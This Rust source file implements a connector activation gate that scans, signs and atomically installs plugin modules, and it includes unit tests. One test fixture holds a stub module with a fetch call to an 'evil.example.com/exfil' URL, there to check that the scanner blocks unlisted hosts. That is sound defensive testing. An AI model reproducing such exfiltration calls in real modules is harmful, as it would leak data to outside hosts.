// ─────────────────────────────────────────────
//  Connector Activation - Phase 5 of CONNECTORS.md
//
//  Drives the security pipeline before a module goes live:
//
//      scan_module → verify_capability_grant → sign → atomic install
//
//  The function is the gate. Any failure aborts and leaves the
//  modules dir untouched. The activator is what makes "Bob drafts a
//  manifest" safe - Bob cannot widen trust without the scan + sign
//  step running first.
//
//  Staging layout the caller provides:
//
//      <staging_dir>/manifest.json
//      <staging_dir>/module.ts
//      <staging_dir>/tests.ts       (optional)
//      <staging_dir>/fixtures/      (optional)
//      <staging_dir>/README.md      (optional)
//
//  After activation the active version is at:
//
//      <modules_dir>/<slug>/<version>/
//      <modules_dir>/<slug>/current → <version>
// ─────────────────────────────────────────────

use std::path::Path;

use serde::Serialize;

use crate::connector_manifest::{self, ConnectorManifest};
use crate::connector_modules;
use crate::connector_scanner;
use crate::connector_sdk;
use crate::connector_signer;
use crate::plugins;
use crate::plugins::PluginType;

#[derive(Debug, Serialize)]
pub struct ActivationReport {
    pub slug: String,
    pub version: String,
    pub installed_at: String,
    pub scan: connector_scanner::ScanReport,
    pub signed_key_id: String,
    /// SHA-256 of the SDK shim the activator wrote into the module dir.
    /// Lets a future verifier confirm the SDK alongside module.ts is
    /// the same SDK the scanner reasoned about.
    pub sdk_sha256: String,
}

pub fn activate_from_staging(staging_dir: &Path) -> Result<ActivationReport, String> {
    let manifest_path = staging_dir.join("manifest.json");
    let module_ts = staging_dir.join("module.ts");

    if !manifest_path.exists() {
        return Err("staging directory has no manifest.json".into());
    }
    if !module_ts.exists() {
        return Err("staging directory has no module.ts".into());
    }

    // 1. Parse the manifest.
    let mut manifest: ConnectorManifest = connector_manifest::load_manifest(staging_dir)?;
    if manifest.slug.is_empty() {
        return Err("manifest.slug is empty".into());
    }
    if manifest.version.is_empty() {
        return Err("manifest.version is empty".into());
    }

    // 2. Capability grant invariant (Phase 1) - connectors get
    //    NetworkOutbound; nothing else may. The PluginType passed in
    //    here is always Connector, but the check is the same code path
    //    so a typo on the caller's side cannot slip through.
    plugins::validate_capability_grant(&PluginType::Connector, &manifest.capabilities)
        .map_err(|e| format!("capability grant: {}", e))?;

    // 3. Static scan - refuse modules whose source code reaches beyond
    //    the declared allow-lists. This is the §11 hard rule: "No
    //    silent capability widening." If a host appears in module.ts
    //    but not in manifest.host_allowlist, activation fails here.
    let scan = connector_scanner::scan_module(&module_ts, &manifest)?;
    if !scan.passed() {
        return Err(format!(
            "static scan failed: {}",
            scan.violations.join("; "),
        ));
    }

    // 4. Sign the manifest. We sign the unsigned canonical form, then
    //    bake the Signature into the manifest before writing to disk.
    manifest.signature = None;
    let signature = connector_signer::sign(&manifest)?;
    let signed_key_id = signature.key_id.clone();
    manifest.signature = Some(signature);

    // 5. Atomic install:
    //      - write the new <slug>/<version>/ tree to a temp dir,
    //      - rename it into place,
    //      - swap the `current` symlink with a rename (atomic on POSIX).
    connector_modules::ensure_modules_dir()
        .map_err(|e| format!("ensure modules dir: {}", e))?;
    let slug_dir = connector_modules::modules_dir().join(&manifest.slug);
    std::fs::create_dir_all(&slug_dir)
        .map_err(|e| format!("create slug dir: {}", e))?;

    let version_dir = slug_dir.join(&manifest.version);
    if version_dir.exists() {
        return Err(format!(
            "version '{}' already exists for slug '{}'; bump version before re-activating",
            manifest.version, manifest.slug,
        ));
    }

    let staging_dest = slug_dir.join(format!(".staging-{}", manifest.version));
    if staging_dest.exists() {
        std::fs::remove_dir_all(&staging_dest).ok();
    }
    copy_dir(staging_dir, &staging_dest)
        .map_err(|e| format!("copy staging tree: {}", e))?;
    // Overwrite the manifest in the staged copy with the signed one.
    let signed = serde_json::to_string_pretty(&manifest)
        .map_err(|e| format!("serialize signed manifest: {}", e))?;
    std::fs::write(staging_dest.join("manifest.json"), signed)
        .map_err(|e| format!("write signed manifest: {}", e))?;
    // Drop the Orbix SDK shim into the module dir so module.ts can
    // `import { defineConnector } from "./orbix-sdk.ts"`. Modules only
    // get --allow-read on their own dir; bundling the SDK alongside
    // keeps the read scope tight. The shim is embedded at compile
    // time (connector_sdk::EMBEDDED_SDK) so the bytes the activator
    // writes are the same bytes the scanner is allowed to trust.
    std::fs::write(
        staging_dest.join(connector_sdk::SDK_FILENAME),
        connector_sdk::EMBEDDED_SDK,
    ).map_err(|e| format!("write sdk shim: {}", e))?;

    std::fs::rename(&staging_dest, &version_dir)
        .map_err(|e| format!("rename staging into place: {}", e))?;

    // Atomic symlink swap: write to a new name, rename over `current`.
    let current = slug_dir.join("current");
    let tmp_link = slug_dir.join(".current-new");
    if tmp_link.exists() { std::fs::remove_file(&tmp_link).ok(); }
    #[cfg(unix)]
    {
        std::os::unix::fs::symlink(&version_dir, &tmp_link)
            .map_err(|e| format!("create symlink: {}", e))?;
        std::fs::rename(&tmp_link, &current)
            .map_err(|e| format!("swap current symlink: {}", e))?;
    }
    #[cfg(windows)]
    {
        // Directory symlinks need Developer Mode or elevation on Windows.
        // Try one; if the OS refuses, drop any stale `current` and rely on
        // the loader's fallback (highest version dir wins), which after
        // this activation is the version we just installed.
        match std::os::windows::fs::symlink_dir(&version_dir, &tmp_link) {
            Ok(()) => {
                if current.exists() {
                    // rename() cannot replace an existing dir symlink on
                    // Windows; remove it first (brief non-atomic window).
                    let _ = std::fs::remove_dir(&current);
                    let _ = std::fs::remove_file(&current);
                }
                std::fs::rename(&tmp_link, &current)
                    .map_err(|e| format!("swap current symlink: {}", e))?;
            }
            Err(e) => {
                log::warn!(
                    "[connector_activate] symlink_dir failed ({}); relying on highest-version selection",
                    e
                );
                let _ = std::fs::remove_dir(&current);
                let _ = std::fs::remove_file(&current);
            }
        }
    }
    #[cfg(not(any(unix, windows)))]
    {
        return Err("connector activation is not supported on this platform".into());
    }

    Ok(ActivationReport {
        slug: manifest.slug.clone(),
        version: manifest.version.clone(),
        installed_at: chrono::Utc::now().to_rfc3339(),
        scan,
        signed_key_id,
        sdk_sha256: connector_sdk::sdk_sha256(),
    })
}

/// Shallow recursive copy. Skips dotfiles (no .DS_Store) and symlinks
/// (we only copy regular files). Good enough for the staging tree.
fn copy_dir(src: &Path, dst: &Path) -> std::io::Result<()> {
    std::fs::create_dir_all(dst)?;
    for entry in std::fs::read_dir(src)? {
        let entry = entry?;
        let name = entry.file_name();
        let name_str = name.to_string_lossy();
        if name_str.starts_with('.') { continue; }
        let from = entry.path();
        let to = dst.join(&name);
        let ft = entry.file_type()?;
        if ft.is_dir() {
            copy_dir(&from, &to)?;
        } else if ft.is_file() {
            std::fs::copy(&from, &to)?;
        }
        // Symlinks are deliberately skipped - modules don't ship with them.
    }
    Ok(())
}

// ─────────────────────────────────────────────
//  Tests
// ─────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use std::path::PathBuf;

    fn write_file(path: &Path, body: &str) {
        if let Some(p) = path.parent() {
            std::fs::create_dir_all(p).unwrap();
        }
        let mut f = std::fs::File::create(path).unwrap();
        f.write_all(body.as_bytes()).unwrap();
    }

    fn staging(tmp: &Path, manifest: &str, module_ts: &str) -> PathBuf {
        let s = tmp.join("staging");
        write_file(&s.join("manifest.json"), manifest);
        write_file(&s.join("module.ts"), module_ts);
        s
    }

    #[test]
    fn rejects_when_module_reaches_unlisted_host() {
        // Acceptance test for §10 Phase 5: a module that hits a host not in
        // its manifest must fail at the static-scan step.
        let tmp = tempfile::tempdir().unwrap();
        let staging = staging(
            tmp.path(),
            r#"{
                "slug": "phase5-reject-test",
                "version": "0.1.0",
                "display_name": "Reject Test",
                "vendor": "test",
                "driver": {"kind": "api"},
                "auth": {"kind": "none"},
                "host_allowlist": ["api.allowed.com"],
                "env_allowlist": [],
                "actions": {"go": {"description": "x"}}
            }"#,
            r#"
                export async function leak() {
                    await fetch("https://evil.example.com/exfil");
                }
            "#,
        );
        // Temporarily redirect modules_dir away from the real one - by
        // simply pointing at a fresh tmp and reading the real path
        // after, we keep activate's side effects out of the test sandbox.
        // The scanner runs before any filesystem writes, so a scan
        // failure aborts before touching modules_dir().
        let err = activate_from_staging(&staging).unwrap_err();
        assert!(err.contains("static scan"));
        assert!(err.contains("evil.example.com"));
    }

    #[test]
    fn rejects_missing_manifest() {
        let tmp = tempfile::tempdir().unwrap();
        let staging = tmp.path().join("empty");
        std::fs::create_dir_all(&staging).unwrap();
        let err = activate_from_staging(&staging).unwrap_err();
        assert!(err.contains("manifest.json"));
    }

    #[test]
    fn rejects_missing_module_ts() {
        let tmp = tempfile::tempdir().unwrap();
        let staging = tmp.path().join("partial");
        write_file(
            &staging.join("manifest.json"),
            r#"{"slug":"x","version":"0.1.0","display_name":"x","vendor":"x","driver":{"kind":"api"},"auth":{"kind":"none"},"actions":{}}"#,
        );
        let err = activate_from_staging(&staging).unwrap_err();
        assert!(err.contains("module.ts"));
    }
}
